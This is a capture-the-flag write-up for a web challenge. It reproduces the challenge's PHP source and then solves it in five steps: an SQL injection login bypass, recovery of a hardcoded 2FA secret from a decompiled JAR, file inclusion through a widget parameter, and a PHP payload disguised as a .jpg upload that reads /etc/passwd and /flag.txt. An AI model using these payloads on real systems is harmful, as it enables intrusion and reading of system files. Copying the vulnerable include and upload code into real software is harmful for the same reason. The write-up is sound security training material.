---
layout: post
title:  "Best Platform"
date:   2026-05-02 18:59:00 -0400
author: robo.uzi
tags: [CTF]
permalink: /THEMCTF-2026-best-platform/
---

**Author**: BatoiDeA

**Category**: Web

**Description**: The hiring manager points to a screen displaying their newly deployed internal employee portal. "Our IT team claims this is the most secure platform in the world," they tell you. "Your practical assessment is simple: prove them wrong."

Your Mission: Step into the role of the elite penetration tester they are looking for. Audit the system, uncover its hidden vulnerabilities, and hunt down all the flag fragments scattered across the server. Piece them together to form the final flag and prove you have the skills to secure the job.

Note: No automated tools or brute-forcing needed so solve this challenge manually.

I get the challenge files:
```shell
unzip BestPlatform.zip  
Archive:  BestPlatform.zip  
   creating: BestPlatform/  
  inflating: BestPlatform/docker-compose.yml  
  inflating: BestPlatform/init.sql  
   creating: BestPlatform/website/  
  inflating: BestPlatform/website/Dockerfile  
  inflating: BestPlatform/website/entrypoint.sh  
   creating: BestPlatform/website/src/  
   creating: BestPlatform/website/src/admin/  
  inflating: BestPlatform/website/src/admin/index.php  
  inflating: BestPlatform/website/src/admin/panel.php  
   creating: BestPlatform/website/src/downloads/  
  inflating: BestPlatform/website/src/downloads/Authenticator.jar  
 extracting: BestPlatform/website/src/index.php  
  inflating: BestPlatform/website/src/robots.txt  
  inflating: BestPlatform/website/src/style.css  
   creating: BestPlatform/website/src/user/  
  inflating: BestPlatform/website/src/user/dashboard.php  
  inflating: BestPlatform/website/src/user/index.php  
   creating: BestPlatform/website/src/user/uploads/  
  inflating: BestPlatform/website/src/user/uploads/.htaccess
```

`robots.txt`:
```shell
cat robots.txt  
User-agent: *  
Disallow: /downloads/Authenticator.jar
```

`entrypoint.sh`:
```shell
cat entrypoint.sh  
#!/bin/bash  
  
echo "# ${FLAG_PART_3}" >> /var/www/html/user/uploads/.htaccess  
  
echo "flag4_user:x:1000:1000:${FLAG_PART_4}:/home/flag:/bin/bash" >> /etc/passwd  
  
echo "${FLAG_PART_5}" > /flag.txt  
  
apache2-foreground
```

`panel.php`:
```php
<?php
session_start();
if (!isset($_SESSION['admin_auth']) || $_SESSION['admin_auth'] !== true) {
    header("Location: index.php"); exit();
}

if (isset($_GET['logout'])) {
    unset($_SESSION['admin_auth']); header("Location: index.php"); exit();
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>SecurityNet Admin Console</title>
    <link rel="stylesheet" href="../style.css">
    <style>
        :root { --primary-color: var(--admin-color); } 
    </style>
</head>
<body style="align-items: flex-start; background: #050505;">

<div class="app-layout">
    <div class="sidebar">
        <div class="sidebar-logo admin">OVERSEER_UI</div>
        <div class="nav-item active">Dashboard</div>
        <div class="nav-item">User Management</div>
        <div class="nav-item">Firewall Config</div>
        <div class="nav-item">Audit Logs</div>
        <a href="panel.php?logout=1" class="nav-item logout-btn">Emergency Logout</a>
    </div>

    <div class="main-content">
        <div class="top-bar">
            <h2>System Overview <span style="font-size: 0.5em; padding: 3px 8px; background: rgba(255, 170, 0, 0.2); color: var(--admin-color); border-radius: 4px; vertical-align: middle;">ROOT</span></h2>
            <div style="color: rgba(255,255,255,0.5);">Node: secnet-core-v2.1</div>
        </div>

        <div class="grid-container" style="grid-template-columns: 2fr 1fr;">
            <div>
                <div class="content-card" style="margin-bottom: 25px;">
                    <div class="card-title">Network Traffic Activity</div>
                    <p style="color: #444; font-style: italic;">[ Graph module disabled due to high CPU load ]</p>
                    <div style="display: flex; justify-content: space-between; margin-top: 20px;">
                        <div><h3 style="margin:0; color: var(--text-color);">1,402</h3><span style="font-size:0.8em; color: gray;">Requests/h</span></div>
                        <div><h3 style="margin:0; color: #00ff88;">99.8%</h3><span style="font-size:0.8em; color: gray;">Uptime</span></div>
                        <div><h3 style="margin:0; color: var(--secondary-color);">12</h3><span style="font-size:0.8em; color: gray;">Threats Blocked</span></div>
                    </div>
                </div>

                <div class="content-card">
                    <div class="card-title">Active Employee Sessions</div>
                    <table class="data-table">
                        <tr><th>User ID</th><th>Username</th><th>IP Address</th><th>Status</th></tr>
                        <tr><td>#8814</td><td>j.smith</td><td>192.168.1.15</td><td class="status-active">Active</td></tr>
                        <tr><td>#8815</td><td>k.davis</td><td>192.168.1.42</td><td class="status-active">Active</td></tr>
                        <tr><td>#8816</td><td>guest_acc</td><td>10.0.0.99</td><td class="status-blocked">Suspended</td></tr>
                    </table>
                </div>
            </div>

            <div class="content-card">
                <div class="card-title" style="color: var(--secondary-color); border-bottom-color: rgba(255, 51, 102, 0.2);">Classified Memos</div>
                
                <div style="background: rgba(255, 170, 0, 0.05); border-left: 3px solid var(--admin-color); padding: 15px; margin-bottom: 20px; font-size: 0.9em;">
                    <p style="margin-top: 0; color: rgba(255,255,255,0.7);"><strong>TO:</strong> All IT Staff<br><strong>DATE:</strong> 12/04</p>
                    <p style="color: #fff; line-height: 1.5;">
                        "I always forget how to verify 2fa. 
                        Don't worry, the <span style="color: var(--admin-color); font-weight: bold;">robots</span> will help you find it. 
                        Do not share this outside the network."
                    </p>
                </div>

                <div style="background: #0a0c10; padding: 15px; border-radius: 4px; border: 1px dashed #333;">
                    <p style="color: gray; margin-top: 0; font-size: 0.8em; text-transform: uppercase;">Decrypted Payload:</p>
                    <p style="color: var(--admin-color); font-size: 1.1em; font-weight: bold; letter-spacing: 1px; margin: 0; word-break: break-all;">
    <?php echo htmlspecialchars(getenv('FLAG_PART_1')); ?>
</p>
                </div>
            </div>
        </div>
    </div>
</div>

</body>
</html>
```

`dashboard.php`:
```php
<?php
session_start();

if (isset($_GET['logout'])) {
    session_unset();
    session_destroy();
    header("Location: index.php"); 
    exit();
}

if (!isset($_SESSION['user_id']) || !isset($_SESSION['2fa_verified']) || $_SESSION['2fa_verified'] !== true) {
    header("Location: index.php"); exit();
}

$upload_msg = "";
$current_avatar = "https://via.placeholder.com/150/0a0c10/00ff88?text=NO+IMG";

if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_FILES["avatar"])) {
    $target_dir = "uploads/";
    $filename = basename($_FILES["avatar"]["name"]);
    $target_file = $target_dir . $filename;
    $imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));

    if ($imageFileType != "jpg" && $imageFileType != "png") {
        $upload_msg = "<div class='message error'>Invalid format. .JPG or .PNG only.</div>";
    } else {
        if (move_uploaded_file($_FILES["avatar"]["tmp_name"], $target_file)) {
            $upload_msg = "<div class='message success' style='text-align: left;'>
                <h4>Profile synchronized!</h4>
                <p>Path: <code>" . htmlspecialchars($target_file) . "</code></p>
            </div>";
        } else {
            $upload_msg = "<div class='message error'>Upload failed. Storage error.</div>";
        }
    }
}

$files_in_uploads = glob("uploads/*.*");
if (!empty($files_in_uploads)) {
    $current_avatar = end($files_in_uploads);
}

$widget_output = "";
$flag2 = getenv('FLAG_PART_2');

if (isset($_GET['widget'])) {
    $widget = $_GET['widget'];
    
    if (strpos($widget, '../') !== false || strpos($widget, '..\\') !== false) {
        $widget_output = "Security Alert: Something Strange Detected. Incident reported!";
    } elseif (substr($widget, 0, 1) === '/') {
        $widget_output = "Security Alert: Absolute Path Detected. Nice try hacker!";
    } elseif (strpos($widget, '://') !== false) {
        $widget_output = "Security Alert: Protocol Wrapper Detected!";
    } else {
        ob_start(); 
        include($widget);
        $widget_output = ob_get_clean();
    }
} else {
    $widget_output = "System Initialized...\n2FA Authentication: SUCCESS\nSecurity Token Sync: OK\n\nWaiting for diagnostic module selection...";
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>SecurityNET Employee Portal</title>
    <link rel="stylesheet" href="../style.css">
</head>
<body style="align-items: flex-start;">

<div class="app-layout">
    <div class="sidebar">
        <div class="sidebar-logo">SecurityNET_OS</div>
        <div class="nav-item active">My Profile</div>
        <div class="nav-item">Messages (0)</div>
        <div class="nav-item">Settings</div>
        <a href="dashboard.php?logout=1" class="nav-item logout-btn">Disconnect</a>
    </div>

    <div class="main-content">
        <div class="top-bar">
            <h2>Welcome back, <span style="color: var(--primary-color);">@<?php echo htmlspecialchars($_SESSION['username']); ?></span></h2>
            <div style="color: rgba(255,255,255,0.5);">Role: Employee Level 1</div>
        </div>

        <div class="grid-container">
            <div class="content-card profile-wrap">
                <div class="card-title" style="width: 100%;">Identity Card</div>

                <img src="<?php echo htmlspecialchars($current_avatar); ?>"
                     class="avatar-display"
                     alt="User Avatar"
                     data-sys-token="<?php echo htmlspecialchars($flag2); ?>"
                     onerror="this.onerror=null; this.src='https://via.placeholder.com/150/0a0c10/ff3366?text=BROKEN'">
                
                <div class="avatar-info">
                    ID: E-882<?php echo $_SESSION['user_id']; ?><br>
                    Clearance: Standard
                </div>
                
                <?php echo $upload_msg; ?>
                
                <form action="dashboard.php" method="POST" enctype="multipart/form-data" style="width: 100%;">
                    <p style="font-size: 0.8em; color: #888; margin-bottom: 5px;">Update Identity File (.jpg, .png):</p>
                    <input type="file" name="avatar" required style="display: block; width: 100%; margin-bottom: 15px; font-size: 0.8em;">
                    <button type="submit" style="padding: 8px;">Sync Profile</button>
                </form>
            </div>

            <div class="content-card">
                <div class="card-title">System Diagnostic Modules</div>
                <p style="font-size: 0.9em; color: rgba(255,255,255,0.6); margin-bottom: 20px;">
                    Run internal network checks. Unauthorized module execution is strictly prohibited.
                </p>
                
                <div class="widget-links">
                    <a href="dashboard.php?widget=calendar">View Calendar</a>
                    <a href="dashboard.php?widget=notes">Memo Notes</a>
                    <a href="dashboard.php?widget=system_status">Ping Server</a>
                </div>

                <div class="terminal" style="margin-top: 20px;">
                    <?php if (!empty($widget_output)) { echo "<pre>" . htmlspecialchars($widget_output) . "</pre>"; } ?>
                </div>
            </div>
        </div>
    </div>
</div>

</body>
</html>
```

So there are 5 parts to the flag I need to find. Part 1 is on the admin panel. Part 2 is on the user dashboard. Part 3 is in `/var/www/html/user/uploads/.htaccess`. Part 4 is in `/etc/passwd` and part 5 is in `/flag.txt`.

Going to the site:

![Alt text](/images/themctf2026web1.png)

I go to `http://35.234.84.138:8002/downloads/Authenticator.jar` and download that file. Decompiling it on [https://jdec.app/](https://jdec.app/):
```java
/* Decompiler 6ms, total 317ms, lines 23 */
public class Authenticator {
   private static final String SECRET_KEY = "5up3r_S3cre7_key";

   public static void main(String[] var0) {
      if (var0.length != 1) {
         System.out.println("Error: Missing username argument.");
      } else {
         System.out.println(generateOTP(var0[0]));
      }
   }

   public static String generateOTP(String var0) {
      String var1 = var0 + "_5up3r_S3cre7_key";
      int var2 = 0;

      for(int var3 = 0; var3 < var1.length(); ++var3) {
         var2 = var2 * 31 + var1.charAt(var3);
      }

      return String.format("%06d", Math.abs(var2) % 1000000);
   }
}
```
This will give me the two factor authenication code easily. 

First I get to `http://35.234.84.138:8002/admin/panel.php` by logging in on `http://35.234.84.138:8002/admin/index.php` with `admin' OR 1=1-- :idk`.

![Alt text](/images/themctf2026web2.png)

Get part one of the flag.

I don't need to register a new user. I go to `http://35.234.84.138:8002/user/index.php` and login with `idk' OR 1=1-- :idk' OR 1=1-- `. Now it prompts me for the admins 2FA code:

![Alt text](/images/themctf2026web3.png)

Get the code with `Authenticator.jar`:
```shell
java -jar Authenticator.jar 'admin'  
469761
```

Now I am on `http://35.234.84.138:8002/user/dashboard.php`:

![Alt text](/images/themctf2026web4.png)

On `view-source:http://35.234.84.138:8002/user/dashboard.php` is part 2 of the flag: `data-sys-token="Part_2/5:C4n_L30_"`

I can access any file in the `uploads` directory. I get part 3 of the flag by going to `http://35.234.84.138:8002/user/dashboard.php?widget=uploads/.htaccess`:

![Alt text](/images/themctf2026web5.png)

Now for flag parts 4 and 5 I need to access `/etc/passwd` and `/flag.txt`. I do this via the file upload feature because they filter out directory traversal (from `dashboard.php`):
```php
$upload_msg = "";
$current_avatar = "https://via.placeholder.com/150/0a0c10/00ff88?text=NO+IMG";

if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_FILES["avatar"])) {
    $target_dir = "uploads/";
    $filename = basename($_FILES["avatar"]["name"]);
    $target_file = $target_dir . $filename;
    $imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));

    if ($imageFileType != "jpg" && $imageFileType != "png") {
        $upload_msg = "<div class='message error'>Invalid format. .JPG or .PNG only.</div>";
    } else {
        if (move_uploaded_file($_FILES["avatar"]["tmp_name"], $target_file)) {
            $upload_msg = "<div class='message success' style='text-align: left;'>
                <h4>Profile synchronized!</h4>
                <p>Path: <code>" . htmlspecialchars($target_file) . "</code></p>
            </div>";
        } else {
            $upload_msg = "<div class='message error'>Upload failed. Storage error.</div>";
        }
    }
}
... etc
if (isset($_GET['widget'])) {
    $widget = $_GET['widget'];
    
    if (strpos($widget, '../') !== false || strpos($widget, '..\\') !== false) {
        $widget_output = "Security Alert: Something Strange Detected. Incident reported!";
    } elseif (substr($widget, 0, 1) === '/') {
        $widget_output = "Security Alert: Absolute Path Detected. Nice try hacker!";
    } elseif (strpos($widget, '://') !== false) {
        $widget_output = "Security Alert: Protocol Wrapper Detected!";
    } else {
        ob_start(); 
        include($widget);
        $widget_output = ob_get_clean();
    }
} else {
    $widget_output = "System Initialized...\n2FA Authentication: SUCCESS\nSecurity Token Sync: OK\n\nWaiting for diagnostic module selection...";
}
... etc
```

Create a file called `test.jpg` containing this php:
```shell
cat test.jpg  
<?php echo file_get_contents('/etc/passwd'); ?>
```

I upload the file then visit `http://35.234.84.138:8002/user/dashboard.php?widget=uploads/test.jpg`:
```shell
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
flag4_user:x:1000:1000:Part_4/5:V3ry_:/home/flag:/bin/bash
```

For part 5 do the same thing but upload the "image" with:
```shell
cat test.jpg  
<?php echo file_get_contents('/flag.txt'); ?>
```

Response:
```shell
Part_5/5:Sm4rt_B0y_e7b9d4c2a5}
```

Recap:
- SQL injection > admin access
- Decompile `.jar` > bypass two factor authentication to login as a user
- Read files via `widget` parameter
- File upload > arbitrary file read

`THEM?!CTF{0nly_Us3r_C4n_L30_T0w3r_V3ry_Sm4rt_B0y_e7b9d4c2a5}`
